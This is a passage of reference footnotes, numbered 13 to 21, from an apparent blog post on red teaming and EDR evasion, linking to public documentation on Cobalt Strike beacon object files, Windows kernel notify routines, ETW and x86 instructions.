13. [https://en.wikipedia.org/wiki/Position-independent\_code](https://en.wikipedia.org/wiki/Position-independent_code) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#54e90f32-844d-4c9a-b618-0c30b0f819ea-link)
14. [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files\_main.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#21563ac9-99ea-4aca-a16e-513b183fc1ad-link)
15. <https://learn.microsoft.com/en-us/cpp/cpp/stdcall> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c9c503f8-ef6a-4456-a99d-d3dbe23b07ca-link)
16. <https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#beb24e60-5081-4d4d-9893-171865561078-link)
17. <https://www.felixcloutier.com/x86/lea> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#92454169-a059-4c6e-bbcb-b92f8bac754c-link)
18. [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics\_aggressor-scripts/as-resources\_functions.htm#bof\_pack](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bof_pack) [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#b4e4ab6a-3024-4673-b724-fea7bedd7042-link)
19. <https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c8fe9216-5079-4cf0-8cfe-7e8c5edd3e6f-link)
20. <https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#77d6f08a-3550-47cd-bb5d-28f618ff8a4e-link)
21. <https://learn.microsoft.com/zh-cn/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-> [↩︎](https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#4ccf8e4c-c5db-4e01-a123-6be2ecc6bdc8-link)